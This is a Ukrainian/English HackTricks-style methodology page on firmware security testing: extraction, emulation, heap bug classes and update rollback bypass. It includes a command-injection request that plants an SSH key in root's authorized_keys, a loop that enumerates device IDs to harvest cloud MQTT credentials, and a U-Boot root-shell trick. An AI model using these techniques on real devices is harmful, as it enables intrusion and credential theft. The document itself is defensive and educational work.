# Аналіз прошивки

{{#include ../../banners/hacktricks-training.md}}

## **Вступ**

### Пов’язані ресурси


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware є критично важливим software, який дає змогу пристроям працювати коректно, керуючи та забезпечуючи зв’язок між hardware-компонентами і software, з яким взаємодіє користувач. Він зберігається в постійній memory, забезпечуючи пристрою доступ до життєво важливих інструкцій від моменту ввімкнення, що призводить до запуску operating system. Аналіз і потенційна модифікація firmware є критично важливим кроком для виявлення security vulnerabilities.

## **Збирання інформації**

**Збирання інформації** — це критично важливий початковий крок для розуміння складу пристрою та технологій, які він використовує. Цей процес включає збирання даних про:

- CPU architecture та operating system, на якій він працює
- Особливості bootloader
- Розташування hardware і datasheets
- Метрики codebase і розташування source
- Зовнішні libraries і типи license
- Історію updates і regulatory certifications
- Architectural і flow diagrams
- security assessments і виявлені vulnerabilities

Для цієї мети tools **open-source intelligence (OSINT)** є безцінними, як і аналіз будь-яких доступних open-source software components через manual та automated review processes. Tools на кшталт [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore) пропонують безплатний static analysis, який можна використати для виявлення потенційних проблем.

## **Отримання firmware**

Отримати firmware можна різними способами, кожен із власним рівнем складності:

- **Безпосередньо** з джерела (developers, manufacturers)
- **Зібрати** її за наданими інструкціями
- **Завантажити** з офіційних support sites
- Використовувати **Google dork** queries для пошуку розміщених файлів firmware
- Отримувати доступ до **cloud storage** безпосередньо за допомогою tools на кшталт [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехоплювати **updates** через man-in-the-middle techniques
- **Витягувати** з пристрою через connections на кшталт **UART**, **JTAG** або **PICit**
- **Sniffing** запитів на оновлення в device communication
- Виявляти та використовувати **hardcoded update endpoints**
- **Dumping** із bootloader або network
- **Видаляти та зчитувати** storage chip, коли все інше не спрацьовує, використовуючи відповідні hardware tools

### UART-only logs: force a root shell via U-Boot env in flash

Якщо UART RX ігнорується (лише logs), ви все одно можете примусово запустити init shell, **відредагувавши U-Boot environment blob** offline:

1. Зчитайте SPI flash за допомогою SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Знайдіть U-Boot env partition, відредагуйте `bootargs`, щоб додати `init=/bin/sh`, і **перерахуйтe U-Boot env CRC32** для blob.
3. Перепрошийте лише env partition і перезавантажте пристрій; shell має з’явитися на UART.

Це корисно на embedded devices, де bootloader shell вимкнено, але env partition доступний на запис через external flash access.

## Аналіз firmware

Тепер, коли ви **маєте firmware**, вам потрібно витягти з неї інформацію, щоб зрозуміти, як з нею поводитися. Різні tools, які можна для цього використати:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Якщо з цими tools ти не знаходиш багато, перевір **entropy** image за допомогою `binwalk -E <bin>`, якщо entropy низька, то, ймовірно, він не encrypted. Якщо entropy висока, він, ймовірно, encrypted (або compressed якимось чином).

Крім того, ти можеш використовувати ці tools, щоб extract **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Або [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) для inspect файлу.

### Getting the Filesystem

За допомогою попередніх commented tools, як-от `binwalk -ev <bin>`, ти мав би вже змогти **extract the filesystem**.\
Binwalk зазвичай extracts його всередину **folder з назвою типу filesystem**, яка зазвичай одна з таких: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Іноді binwalk **не матиме magic byte filesystem у своїх signatures**. У таких cases використай binwalk, щоб **find the offset of the filesystem and carve the compressed filesystem** з binary і **manually extract** filesystem відповідно до його type, використовуючи steps нижче.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Запустіть таку **dd command** для вирізання файлової системи Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Альтернативно, також можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у директорії "`squashfs-root`".

- Файли CPIO archive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для jffs2 файлових систем

`$ jefferson rootfsfile.jffs2`

- Для ubifs файлових систем з NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Аналіз Firmware

Після отримання firmware, важливо розібрати її, щоб зрозуміти її структуру та потенційні уразливості. Цей процес включає використання різних інструментів для аналізу та витягування цінних даних з образу firmware.

### Інструменти початкового аналізу

Наведено набір команд для початкового огляду бінарного файлу (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягнути strings, проаналізувати бінарні дані та з’ясувати деталі розділів і файлової системи:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Для оцінки стану шифрування образу перевіряється **entropy** за допомогою `binwalk -E <bin>`. Низька entropy вказує на відсутність шифрування, тоді як висока entropy свідчить про можливе шифрування або стиснення.

Для витягування **embedded files** рекомендуються інструменти та ресурси, як-от документація **file-data-carving-recovery-tools** і **binvis.io** для аналізу файлів.

### Extracting the Filesystem

Використовуючи `binwalk -ev <bin>`, зазвичай можна витягнути filesystem, часто в директорію, названу за типом filesystem (наприклад, squashfs, ubifs). Однак, коли **binwalk** не може розпізнати тип filesystem через відсутні magic bytes, потрібне ручне витягування. Це передбачає використання `binwalk` для визначення offset filesystem, а потім команди `dd` для вирізання filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного витягування вмісту використовуються різні команди.

### Аналіз файлової системи

Після витягування файлової системи починається пошук проблем безпеки. Увага приділяється небезпечним network daemons, hardcoded credentials, API endpoints, функціональності update server, нескомпільованому коду, startup scripts і скомпільованим binaries для offline analysis.

**Ключові місця** та **елементи** для перевірки включають:

- **etc/shadow** і **etc/passwd** для user credentials
- SSL certificates і keys у **etc/ssl**
- Configuration і script files на наявність потенційних vulnerabilities
- Embedded binaries для подальшого analysis
- Поширені web servers і binaries IoT devices

Кілька tools допомагають виявляти sensitive information і vulnerabilities у файловій системі:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для static and dynamic analysis

### Security Checks on Compiled Binaries

І source code, і compiled binaries, знайдені у файловій системі, потрібно ретельно перевіряти на vulnerabilities. Tools like **checksec.sh** для Unix binaries і **PESecurity** для Windows binaries допомагають виявляти unprotected binaries, які можна exploited.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Багато IoT hubs отримують per-device configuration з cloud endpoint, який має вигляд:

- `https://<api-host>/pf/<deviceId>/<token>`

Під час firmware analysis ви можете виявити, що `<token>` локально derived з device ID за допомогою hardcoded secret, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений як uppercase hex

Такий design дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відновити URL і отримати cloud config, часто розкриваючи plaintext MQTT credentials і topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Шукайте рядки, що виводять pattern URL конфігурації cloud та адресу broker, наприклад:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Відновіть STATIC_KEY і token algorithm із firmware

- Завантажте binary у Ghidra/radare2 і пошукайте config path ("/pf/") або використання MD5.
- Підтвердіть algorithm (наприклад, MD5(deviceId||STATIC_KEY)).
- Виведіть token у Bash і переведіть digest у uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Зібрати cloud config і MQTT credentials

- Складіть URL і витягніть JSON за допомогою curl; розберіть його з jq, щоб витягнути secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Зловживайте plaintext MQTT і weak topic ACLs (якщо присутні)

- Використайте відновлені credentials, щоб підписатися на maintenance topics і шукати sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Перерахування передбачуваних device IDs (у масштабі, з authorization)

- Багато ecosystems вбудовують vendor OUI/product/type bytes, за якими йде sequential suffix.
- Ви можете ітерувати candidate IDs, deriv e tokens and fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Нотатки
- Завжди отримуйте явну авторизацію перед спробою масової enumeration.
- За можливості надавайте перевагу emulation або static analysis для відновлення secrets без модифікації target hardware.

Процес emulating firmware дає змогу виконувати **dynamic analysis** або роботи пристрою, або окремої програми. Цей підхід може стикатися з труднощами через залежності від hardware або architecture, але перенесення root filesystem або конкретних binaries на пристрій із відповідними architecture і endianness, наприклад Raspberry Pi, або у заздалегідь зібрану virtual machine, може полегшити подальше testing.

### Emulating Individual Binaries

Для аналізу окремих programs критично важливо визначити їхній endianness і CPU architecture.

#### Example with MIPS Architecture

Щоб emulate binary архітектури MIPS, можна використати команду:
```bash
file ./squashfs-root/bin/busybox
```
А також щоб встановити необхідні інструменти емуляції:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Для MIPS (big-endian) використовується `qemu-mips`, а для little-endian бінарників слід обрати `qemu-mipsel`.

#### ARM Architecture Emulation

Для ARM бінарників процес аналогічний, із використанням емулятора `qemu-arm` для емуляції.

### Full System Emulation

Інструменти на кшталт [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші полегшують full firmware emulation, автоматизуючи процес і допомагаючи в dynamic analysis.

## Dynamic Analysis in Practice

На цьому етапі для аналізу використовується або реальне, або емуляційне середовище пристрою. Важливо підтримувати shell access до OS і filesystem. Emulation може не повністю імітувати взаємодії з hardware, що іноді потребує перезапусків emulation. Аналіз має повертатися до filesystem, експлуатувати доступні webpages і network services, а також досліджувати bootloader vulnerabilities. Перевірки integrity firmware є критично важливими для виявлення можливих backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis передбачає взаємодію з process або binary у його operating environment, використовуючи інструменти на кшталт gdb-multiarch, Frida та Ghidra для встановлення breakpoints і виявлення vulnerabilities через fuzzing та інші techniques.

Для embedded targets без повноцінного debugger’а **скопіюйте statically-linked `gdbserver`** на пристрій і підключіться remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

На IoT hubs RF stack часто розділений між **radio MCU** і Linux userland process. Корисний workflow — зіставити шлях:

1. **RF frame** в ефірі
2. **controller-side parser** на radio MCU
3. **serial/UART text or TLV protocol** forwarded to Linux (for example `/dev/tty*`)
4. **application dispatcher** у main daemon
5. **protocol-specific handler / state machine**

Ця архітектура створює два reversing targets замість одного. Якщо controller перетворює binary radio frames на textual protocol, як-от `Group,Command,arg1,arg2,...`, відновіть:

- **message groups** і dispatch tables
- Які messages можуть приходити з **network** versus самого controller
- Точні **manufacturer-specific discriminator fields** (for example Zigbee `manufacturer_code` і custom `cluster_command`)
- Які handlers доступні лише під час **commissioning**, discovery або firmware/model download phases

Для Zigbee specifically, capture pairing traffic і перевірте, чи target усе ще покладається на default **Link Key** `ZigBeeAlliance09`. Якщо так, sniffing commissioning traffic може розкрити **Network Key**. Zigbee 3.0 install codes зменшують цю експозицію, тож зафіксуйте, чи tested device actually enforce them.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands часто є кращою ціллю, ніж standardized clusters, бо вони потрапляють у **custom parsing code** і internal **FSMs** з менш випробуваною validation.

Практичний workflow:

- Reverse command dispatcher, доки не знайдете **vendor-only handler**.
- Відновіть **FSM state**, **event**, **check**, **action**, і **next-state** tables.
- Визначте **transitional states**, що auto-advance, та retry/error branches, які зрештою reset або free attacker-controlled state.
- Підтвердіть, які legitimate protocol exchanges потрібні, щоб перевести daemon у vulnerable state, замість припущення, що buggy handler завжди reachable.

Для timing-sensitive protocols packet replay з Python framework може бути занадто повільним. Більш надійний підхід — emulation legitimate device на real hardware (for example an **nRF52840**) з vendor-grade stack, щоб ви могли відкрити правильні **endpoints**, **attributes**, і commissioning timing.

### Fragmented-download bug class in embedded daemons

Повторюваний class firmware bug з’являється у **fragmented blob/model/configuration downloads**:

1. **first fragment** (`offset == 0`) зберігає `ctx->total_size` і allocates `malloc(total_size)`.
2. Пізніші fragments лише validate attacker-controlled **packet-local** fields, такі як `packet_total_size >= offset + chunk_len`.
3. Copy використовує `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки проти **original allocated size**.

Це дозволяє attacker надіслати:

- Перший valid fragment із **small** declared total size, щоб примусити small heap allocation.
- Пізніший fragment з **expected offset**, але більшим `chunk_len`.
- Forged packet-local size, що задовольняє fresh checks, але все одно overflowes original allocated buffer.

Коли vulnerable path знаходиться за commissioning logic, exploitation має включати достатньо **device emulation**, щоб перевести target у expected model-download або blob-download state перед надсиланням malformed fragments.

### Protocol-driven `free()` triggers

В embedded daemons найпростіший спосіб trigger heap metadata exploitation часто не "wait for cleanup", а **force the protocol's own error handling**:

- Надсилайте malformed follow-up fragments, щоб штовхнути FSM у **retry** або **error** states.
- Перевищте retry threshold, щоб daemon **resets context** і frees corrupted buffer.
- Використовуйте цей predictable `free()` для trigger allocator-side primitives before the process crashes for unrelated reasons.

This is especially useful against **musl/uClibc/dlmalloc-like** allocators in embedded Linux, where corrupting chunk metadata can turn unlink/unbin logic into a write primitive. A stable pattern is to corrupt a **size field** to redirect allocator traversal into **fake chunks staged inside the overflowed buffer**, instead of immediately clobbering real bin pointers and crashing the process.

## Binary Exploitation and Proof-of-Concept

Developing a PoC для identified vulnerabilities requires a deep understanding of the target architecture and programming in lower-level languages. Binary runtime protections in embedded systems are rare, but when present, techniques like Return Oriented Programming (ROP) may be necessary.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc uses fastbins similar to glibc. A later large allocation can trigger `__malloc_consolidate()`, so any fake chunk must survive checks (sane size, `fd = 0`, and surrounding chunks seen as "in use").
- **Non-PIE binaries under ASLR:** if ASLR is enabled but the main binary is **non-PIE**, in-binary `.data/.bss` addresses are stable. You can target a region that already resembles a valid heap chunk header to land a fastbin allocation on a **function pointer table**.
- **Parser-stopping NUL:** when JSON is parsed, a `\x00` in the payload can stop parsing while keeping trailing attacker-controlled bytes for a stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** a ROP chain that calls `open("/proc/self/mem")`, `lseek()`, and `write()` can plant executable shellcode in a known mapping and jump to it.

## Prepared Operating Systems for Firmware Analysis

Operating systems like [AttifyOS](https://github.com/adi0x90/attifyos) and [EmbedOS](https://github.com/scriptingxss/EmbedOS) provide pre-configured environments for firmware security testing, equipped with necessary tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is a distro intended to help you perform security assessment and penetration testing of Internet of Things (IoT) devices. It saves you a lot of time by providing a pre-configured environment with all the necessary tools loaded.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system based on Ubuntu 18.04 preloaded with firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Навіть коли vendor implements cryptographic signature checks for firmware images, **version rollback (downgrade) protection is frequently omitted**. When the boot- or recovery-loader only verifies the signature with an embedded public key but does not compare the *version* (or a monotonic counter) of the image being flashed, an attacker can legitimately install an **older, vulnerable firmware that still bears a valid signature** and thus re-introduce patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Grab it from the vendor’s public download portal, CDN or support site.
* Extract it from companion mobile/desktop applications (e.g. inside an Android APK under `assets/firmware/`).
* Retrieve it from third-party repositories such as VirusTotal, Internet archives, forums, etc.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Many consumer IoT devices expose *unauthenticated* HTTP(S) endpoints that accept Base64-encoded firmware blobs, decode them server-side and trigger recovery/upgrade.
3. After the downgrade, exploit a vulnerability that was patched in the newer release (for example a command-injection filter that was added later).
4. Optionally flash the latest image back or disable updates to avoid detection once persistence is gained.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
У вразливій (downgraded) firmware параметр `md5` безпосередньо конкатенується з shell command без sanitisation, що дозволяє injection довільних commands (тут — увімкнення SSH key-based root access). Пізніші версії firmware запровадили базовий character filter, але відсутність downgrade protection робить виправлення марним.

### Extracting Firmware From Mobile Apps

Багато vendor’ів пакують повні firmware images всередині своїх companion mobile applications, щоб app могла оновлювати device через Bluetooth/Wi-Fi. Зазвичай ці пакети зберігаються unencrypted в APK/APEX за paths на кшталт `assets/fw/` або `res/raw/`. Tools такі як `apktool`, `ghidra` або навіть звичайний `unzip` дозволяють витягнути signed images без доступу до physical hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass anti-rollback лише для updater у дизайнах A/B slot

Деякі вендори справді впроваджують anti-downgrade **ratchet**, але лише всередині логіки *updater* (наприклад, UDS routine через CAN, recovery command або userspace OTA agent). Якщо **bootloader** згодом перевіряє лише підпис/CRC образу і довіряє partition table або slot metadata, rollback protection все ще можна обійти.

Типовий слабкий дизайн:

- Firmware metadata містить і дескриптор версії, і **security ratchet** / monotonic counter.
- Updater порівнює image ratchet зі значенням, збереженим у persistent storage, і відхиляє старіші signed images.
- Bootloader не аналізує цей ratchet і перед booting лише перевіряє header, CRC та signature вибраного slot.
- Slot activation зберігається окремо в partition table або per-slot generation counter і **не прив’язана криптографічно** до точного firmware digest, який був validated.

Це створює примітив **validate-one-image / boot-another-image** у dual-slot системах. Якщо attacker може змусити updater позначити slot B як next boot target, використавши актуальний signed image, а потім може перезаписати slot B до reboot, bootloader все ще може boot downgraded image, бо він довіряє вже committed slot metadata.

Типовий шаблон abuse:

1. Завантажити **current signed** firmware у passive slot і запустити звичайну validation/switch routine, щоб layout позначив цей slot як next active.
2. **Ще не reboot’ити**. Повторно увійти в slot-preparation/erase routine в межах тієї ж сесії.
3. Зловживати stale boot-state або stale slot-selection logic так, щоб updater стер **той самий physical slot**, який щойно був promoted.
4. Записати в цей slot **older but still signed** firmware.
5. Пропустити validation routine, яка enforce’ить ratchet, і reboot напряму.
6. Bootloader обирає promoted slot, перевіряє лише signature/integrity і boot’ить старий image.

На що звертати увагу під час reverse A/B update implementations:

- Slot selection, отриманий із **boot-time flags**, які не refresh’аться після успішного switch.
- Рутину на кшталт `prepare_passive_slot()`, яка erase’ить slot на основі stale state замість **current committed layout**.
- Функцію на кшталт `part_write_layout()`, яка лише підвищує **generation counter** / active flag і не зберігає validated image hash.
- Ratchet checks, реалізовані в userspace або updater code, але **не** в ROM / bootloader / secure boot stages.
- Erase або recovery routines, які залишають slot позначеним як bootable навіть після того, як його content було видалено і переписано.

### Checklist for Assessing Update Logic

* Чи достатньо захищені transport/authentication *update endpoint* (TLS + authentication)?
* Чи порівнює device **version numbers** або **monotonic anti-rollback counter** перед flashing?
* Чи верифікується image всередині secure boot chain (наприклад, signatures перевіряються ROM code)?
* Чи **bootloader enforce’ить той самий ratchet**, що й updater, а не лише перевіряє signature/CRC?
* Чи slot activation metadata **прив’язана до validated firmware digest/version**, чи slot можна змінити після promotion?
* Після успішного slot switch чи device примусово reboot’иться, чи подальші update/erase routines все ще доступні в тій самій сесії?
* Чи userland code виконує додаткові sanity checks (наприклад, allowed partition map, model number)?
* Чи *partial* або *backup* update flows повторно використовують ту саму validation logic?

> 💡  Якщо чогось із наведеного вище бракує, platform, ймовірно, вразлива до rollback attacks.

## Vulnerable firmware to practice

Щоб практикувати виявлення vulnerabilities у firmware, використовуйте такі vulnerable firmware projects як стартову точку.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
